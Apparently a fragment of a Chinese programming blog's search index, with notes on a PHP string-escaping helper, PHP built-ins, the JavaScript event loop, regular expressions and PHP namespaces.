<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape_str</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$like</span> = <span class="literal">FALSE</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$str</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$str</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escape_str</span>(<span class="variable">$val</span>, <span class="variable">$like</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;mysqli_real_escape_string&#x27;</span>) AND <span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;conn_id))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$this</span>-&gt;conn_id, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// escape LIKE condition wildcards</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$like</span> === <span class="literal">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;_&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;\\%&#x27;</span>, <span class="string">&#x27;\\_&#x27;</span>), <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 内置函数的一些注意事项</title>
    <url>/fundamental/programming-language/php/php-internal-function-note/</url>
    <content><![CDATA[<h2 id="PHP-常用函数使用笔记"><a href="#PHP-常用函数使用笔记" class="headerlink" title="PHP 常用函数使用笔记"></a>PHP 常用函数使用笔记</h2><ul>
<li><code>count($arr)</code>  和 <code>strlen($str)</code> 的时间复杂度都是 O(1)，这是因为 PHP 所有变量都是用 Hash 结构存储，在内部维护了 Array 的元素个数和字符串的长度。</li>
<li><code>is_int()</code> 和<code>is_integer</code>是等价的。</li>
<li><code>in_array()</code> <a href="https://stackoverflow.com/questions/2166512/php-case-insensitive-in-array-functions">可以使用第二个参数忽略大小写</a>。</li>
<li>【JavaScript】<code>slice()</code> 的坑：如果该元素是个对象引用 （不是实际的对象），<code>slice</code> 会拷贝这个对象引用到新的数组里。两个对象引用都引用了同一个对象。如果被引用的对象发生改变，则新的和原来的数组中的这个元素也会发生改变。</li>
<li><code>json_encode()</code> json_encode((object)null) &#x3D;&#x3D; {} &amp;&amp; json_encode([]) &#x3D;&#x3D; []</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 执行机制（不完全指北）</title>
    <url>/fundamental/programming-language/javascript/frontend-javascript-execution-procession/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文试图讲解 JavaScript 的执行机制，理解事件循环，读完这篇文章，本文围绕以下两个问题讲解：</p>
<ol>
<li>为什么 JavaScript 是单线程和异步？</li>
<li>JavaScript 如何实现异步？</li>
</ol>
<span id="more"></span>
<h2 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h2><ol>
<li>进程、线程</li>
<li>进程阻塞</li>
<li>阻塞 IO 和非阻塞 IO</li>
<li>同步IO与异步IO</li>
</ol>
<h2 id="JavaScript-的特点"><a href="#JavaScript-的特点" class="headerlink" title="JavaScript 的特点"></a>JavaScript 的特点</h2><ul>
<li><p>单线程</p>
<p>JavaScript 的核心之一是 DOM 对象，在 jQuery 时代 DOM  是 JavaScript 的直接操作单元，试想如果是多线程操作 DOM 会是怎样？如下场景：</p>
<hr>
<p>场景描述:<br>DOM 对象中含有一个 a 节点，如果 process1 对 a 节点进行删除操作, 而 process2 对 a 节点进行编辑操作，那么浏览器该如何保证 JavaScript 有条不紊的执行？</p>
<hr>
<p>多线程的读写操作中，通常是通过加锁保证资源的一致性（状态同步），可是控制如此复杂的 DOM 结构岂是简单的加锁就能解决？因此，JavaScript 就索性使用单线程机制。 单线程的最大好处是不用像多线程编程那样处处在意状态的同步问题，这里没有死锁的存在，也没有线程上下文交换所带来的性能上的开销。</p>
</li>
<li><p>异步<br>基于单线程条件下如果采取同步等待执行任务，那么那些复杂的 DOM 操作以及受外界影响的 IO 操作会导致执行阻塞，用户会感觉到页面很卡顿，从而导致用户体验很差，所以 JavaScript 执行引擎采取了单线程异步执方案。</p>
</li>
</ul>
<h2 id="单线程异步实现原理"><a href="#单线程异步实现原理" class="headerlink" title="单线程异步实现原理"></a>单线程异步实现原理</h2><p>综上述，我们已经知道， JavaScript 的两大特点就是单线程、异步，那么如何在单线程中实现异步呢？这就是本文的重点。<br>However, 如果所有的操作（包括IO&#x2F;定时器&#x2F;文件读写）都在只有一个线程来完成，那么就算实现完美的异步（CPU 100%利用，没有空闲）也将很慢。所以 JavaScript 所谓的单线程是指 JavaScript 的解释引擎中执行 JavaScript 代码的线程只有一个，称作<strong>主线程</strong>,除此之外，还存在一些负责 AJAX 请求、定时器、IO 操作的线程，这些线程称作<strong>工作线程</strong>。</p>
<h3 id="任务分类"><a href="#任务分类" class="headerlink" title="任务分类"></a>任务分类</h3><p>严格来讲，执行引擎将 JavaScript 代码分为两类，宏任务和微任务：</p>
<ul>
<li>macro-task(宏任务)：包括整体代码（script 标签），定时器（setTimeout、setInterval）</li>
<li>micro-task(微任务)：Promise，process.nextTick</li>
</ul>
<h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h3><p>主线程执行，遇到异步任务时，有工作线程执行异步任务，并在主线程中注册回调函数<br><img src="/images/2019-03/async-io-muti-thread.png" alt="异步IO"></p>
<center>(图片来自《深入浅出Node.js》)</center>

<p>在 JavaScript 执行之前，会先将任务放入<strong>宏任务队列</strong>和<strong>微任务队列</strong>中。一次 JavaScript 执行按照如下流程进行，宏任务作为 JavaScript 的执行单位开始执行，宏任务执行结束检查是否有可执行的微任务，如果有则执行所有的微任务，如果没有则结束本次执行。</p>
<div id="flowchart-0" class="flow-chart"></div>
这只是一次 JavaScript 的执行片段，所有微任务执行完毕后（如果有）JavaScript 引擎会重复以上步骤，直到所有的代码都执行完，这个过程就是事件循环（Eventloop)。
<div id="flowchart-1" class="flow-chart"></div>


<h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开始事件循环</span></span><br><span class="line"><span class="comment">// 同步宏任务</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">// 异步宏任务 setTimeOut1</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 进入宏任务异步队列 2</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">    <span class="comment">// 遇到微任务,进入微任务异步队列 3</span></span><br><span class="line">    process.<span class="title function_">nextTick</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 遇到微任务,进入微任务异步队列 3 4 5</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;4&#x27;</span>);</span><br><span class="line">        <span class="title function_">resolve</span>();</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 异步微任务 nextTick</span></span><br><span class="line">process.<span class="title function_">nextTick</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;6&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 异步微任务 Promise1</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;7&#x27;</span>);</span><br><span class="line">    <span class="title function_">resolve</span>();</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异步宏任务 setTimeOut1 setTimeout2</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    process.<span class="title function_">nextTick</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;10&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;11&#x27;</span>);</span><br><span class="line">        <span class="title function_">resolve</span>();</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li><p>主线程执行同步任务(形成一个执行栈)输出 1 , setTimeout1 进入异步宏过任务队列,<br>process1 进入异步微任务队列,遇到 new Promise 输出 7, then 进入异步微任务队列<br>setTimeOut2 进入宏任务队列, 处理微任务队列 process1 和 promise1.then 输出 6,8</p>
</li>
<li><p>开始第三次事件循环处理setTimeout1 ,主线程输出 2 , 4 然后处理异步微任务输出 3,5</p>
</li>
<li><p>开始第四次事件循环处理 setTimeout2 ,主线程输出 9, 11 然后处理异步微任务输出 10, 12</p>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://segmentfault.com/a/1190000012806637">10分钟理解JS引擎的执行机制</a></li>
<li><a href="https://juejin.im/post/59e85eebf265da430d571f89">这一次，彻底弄懂 JavaScript 执行机制</a><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">s=>start: 开始
macro=>operation: 宏任务
execMacro=>operation: 宏任务执行结束
cond=>condition: 是否有可执行的微任务
execMicro=>operation: 执行所微任务
e=>end: 结束

s->macro->execMacro->cond
cond(yes)->execMicro->e
cond(no)->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script><textarea id="flowchart-1-code" style="display: none">s=>start: 开始
macro=>operation: 宏任务队列
execMacro=>operation: 执行一个宏任务
cond=>condition: 是否有可执行的微任务
execMicro=>operation: 执行所微任务
e=>end: 结束

s->macro(bottom)->execMacro(right)->cond
cond(yes)(left)->execMicro(left)->macro
cond(no)->macro</textarea><textarea id="flowchart-1-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-1-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-1-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-1", options);</script></li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Eventloop</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 正则表达式学习笔记</title>
    <url>/fundamental/programming-language/php/php-learn-regular-expression/</url>
    <content><![CDATA[<blockquote>
<p>正则表达式，又称正规表示式、正规表示法、正规表达式、规则表达式、常规表示法（英语：Regular Expression，在代码中常简写为regex、regexp或RE），是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p>
</blockquote>
<span id="more"></span>
<p>以我的理解，正则即是一种查找规则，用与快速查找元素的规则。</p>
<h2 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h2><ul>
<li><p>\b 元字符，代表单词开头或结尾，通常而言单词有空格、标点、tab 、换行等分割。不匹配字符只<strong>匹配位置</strong></p>
</li>
<li><p>.	元字符，匹配除换行以外的任意字符。</p>
</li>
<li><ul>
<li>元字符，代表数量，任意多次（可以 0 次）。前边的内容可以连续重复使用任意次以使整个表达式得到匹配。</li>
</ul>
</li>
<li><ul>
<li>元字符，任意多次（最少 1 次）</li>
</ul>
</li>
<li><p>\d 元字符，匹配一个数字：\d\d\d\d\d\d\d\d\d\d\d &#x3D;&#x3D;&#x3D;&gt; \d{11} 必须连续匹配 11 次</p>
</li>
<li><p>\s 元字符，匹配任意空白符：空格、制表符、换行符、中文全角空格等</p>
</li>
<li><p>\w 元字符，匹配字母、数字、下划线、汉字等</p>
</li>
<li><p>^ 匹配字符串的开始</p>
</li>
<li><p>$ 匹配字符串的结尾，如 &#x2F;^\d{11}$&#x2F;g 要求整个字符串匹配都要求规则，而不是在字符串中匹配符合规则的子串</p>
</li>
</ul>
<h2 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h2><p>查找元字符本身需要字符转义，如查找 .:</p>
<p><img src="/images/20170921/163.png" alt="转义示例"></p>
<h2 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h2><ul>
<li><ul>
<li>重复 0 次或者多次</li>
</ul>
</li>
<li><ul>
<li>重复 1 次或者多次</li>
</ul>
</li>
<li>? 重复 0 次或者 1 次</li>
<li>{n} 重复 n 次</li>
<li>{n,} 至少重复 n 次</li>
</ul>
<p>[未完待续]……</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><p><a href="https://deerchao.net/tutorials/regex/regex.htm">https://deerchao.net/tutorials/regex/regex.htm</a></p>
</li>
<li><p><a href="https://github.com/jawil/blog/issues/20">https://github.com/jawil/blog/issues/20</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 命名空间</title>
    <url>/fundamental/programming-language/php/php-namespace/</url>
    <content><![CDATA[<h2 id="命名空间抽样模型"><a href="#命名空间抽样模型" class="headerlink" title="命名空间抽样模型"></a>命名空间抽样模型</h2><p>编程的本质是抽象，命名空间是一种编程抽象模型，它表示了一个标识符的可见范围。生活中我们会经常遇到两个人完全重名的情况，但是他们是不会被混淆的，因为他们来自不同的家庭，如果两人都来自同一个家庭，那么哥哥叫“小明”，弟弟绝对就不会再起名为“小明”了，我们可以认为每一个家庭都是一个命名空间。这种抽象模型在计算机中也被广泛应用，如计算机操作系统中同一个目录下是不允许有两个相同文件名的文件的，但不同的目录下确可以有文件名相同的文件。如</p>
<span id="more"></span>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whereis python</span></span><br><span class="line">python: /usr/bin/python2.6 /usr/bin/python /usr/local/bin/python2.6</span><br></pre></td></tr></table></figure>
<p>python2.6 分别在不同的目录下，假设要使用 <code>/usr/bin/</code> 下的 python2.6 应按如下方式调用，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">/usr/bin/python2.6 -h</span></span><br></pre></td></tr></table></figure>
<p>要使用 <code>/usr/local/bin</code> 下的 python2.6 则应如下调用，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">/usr/local/bin/python2.6</span></span><br></pre></td></tr></table></figure>

<p>除了使用绝对路径（绝对命名空间）方式调用之外，也可以通过文件的相对路径调用，假设当前路径位于 <code>/usr/</code> 下则，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./bin/python2.6 -v</span></span><br></pre></td></tr></table></figure>
<p>即可调用到 <code>/usr/bin/python2.6</code>。</p>
<p>命名空间是一种编程抽象模型，除了在操作系统中的应用，编程语言中也有广泛应用命名空间。在 PHP 中，命名空间主要用来解决两类问题：</p>
<ul>
<li>命名冲突——用户编写的代码与PHP内部的或第三方的类、函数、常量、接口名字冲突</li>
<li>提高可读性——为很长的标识符名称创建一个别名的名称，提高源代码的可读性</li>
</ul>
<p>PHP命名空间提供了一种将相关的类、函数、常量和接口组合到一起的途径，不同命名空间的类、函数、常量、接口相互隔离不会冲突，注意：PHP命名空间只能隔离类、函数、常量和接口，不包括全局变量。</p>
<h2 id="命名空间使用"><a href="#命名空间使用" class="headerlink" title="命名空间使用"></a>命名空间使用</h2><h3 id="命名空间申明"><a href="#命名空间申明" class="headerlink" title="命名空间申明"></a>命名空间申明</h3><p>命名空间使用 namespace  申明，命名空间必须在除了 <code>declare</code>关键字以外的其他代码之前申明，也就是说只要没有 <code>declare</code> 关键字，命名空间的申明都必须放在文件的开头。假设有一个基类 <code>app/controllers/Controller.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要特别注意的是：<strong>定义命名空间时省略了根空间符号 “&quot;，<code>namespace App\Controllers;</code> 定义的命名空间实际上是 <code>\App\Controller</code>，因此再引用命名空间时一定要记得加上根空间符号”&quot;</strong>，这种特殊方式实际上是可以类比的，如果你熟悉 shell 编程，你就会知道这和 shell 中的变量是一样的，shell 变量再申明或赋值的时候省略了 “$”，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">name = &#x27;Syncher&#x27;; # 申明</span><br><span class="line">...</span><br><span class="line">echo $name;  # 使用</span><br></pre></td></tr></table></figure>



<h3 id="命名空间引用"><a href="#命名空间引用" class="headerlink" title="命名空间引用"></a>命名空间引用</h3><p>在 <code>app/controllers/user/LoginController.php</code> 中要继承  <code>app/controllers</code> 中的 <code>Controller</code> 类，</p>
<ul>
<li>首先需要引入文件</li>
<li>然后引用命名空间</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controllers</span>\<span class="title class_">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../Controller.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> <span class="keyword">extends</span> \<span class="title">App</span>\<span class="title">Controllers</span>\<span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="comment">// some codes here ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>引用命名空间的方式有如下三种，</p>
<ul>
<li><p>非限定名称</p>
<p>  非限定名称，或不包含前缀的类名称，会被解析为当前命名空间下。相当于文件系统中的当前路径，如下所示的 <code>Controller</code> 类将被解析为 <code>\App\Controllers\User\Controller</code>，</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controllers</span>\<span class="title class_">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../Controller.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="comment">// some codes here ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  而当前命名空间下没有该类，因此会报如下错误，</p>
<p>  <img src="/images/20180801/Snipaste_2018-08-01_11-58-23.png"></p>
</li>
<li><p>限定名称</p>
<p>  限定名称,或包含前缀的名称和非限定名称类似，相当于文件系统中的相对路径，如下代码中的 <code>Controller</code> 类将被解析为 <code>\App\Controllers\User\App\Controllers\Controller</code>，</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controllers</span>\<span class="title class_">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../Controller.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> <span class="keyword">extends</span> <span class="title">App</span>\<span class="title">Controllers</span>\<span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="comment">// some codes here ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  而当前命名空间下没有该类，因此会报如下错误，</p>
<p>  <img src="/images/20180801/Snipaste_2018-08-01_11-53-44.png"></p>
</li>
<li><p>完全限定名称</p>
<p>  完全限定名称，或包含了全局前缀操作符的名称，相当于文件系统中的相对路径。如下为正确的对 Controller 类的继承，</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> <span class="keyword">extends</span> \<span class="title">App</span>\<span class="title">Controllers</span>\<span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="comment">// some codes here ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>除了在标识符前面添加限定词之外，还可以使用 <code>use</code> 导入使用类，如<code>use \App\Controllers\Controller as Controller;</code> as 是指定导入类的别名，如果导入类的别名和原名相同则可省略别名的描述。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controllers</span>\<span class="title class_">User</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">App</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>; <span class="comment">// 相当于：use \App\Controllers\Controller as Controller;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../Controller.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="comment">// some codes here ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<p>根据 PSR 要求，命名空间应与文件路径一致，比如 Laravel 默认生成的 <code>app/Http/Controllers/Auth/LoginController.php</code>，其命名空间为 <code>App\Http\Controllers\Auth</code>，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>\<span class="title class_">Auth</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Auth</span>\<span class="title">AuthenticatesUsers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// code here ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>命名空间与文件路径一致是 PSR 的规范，但这并不意味这命名空间和文件名有关联，实际上二者并无关系，这样规范是为了更加方便自动加载。</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
</search>
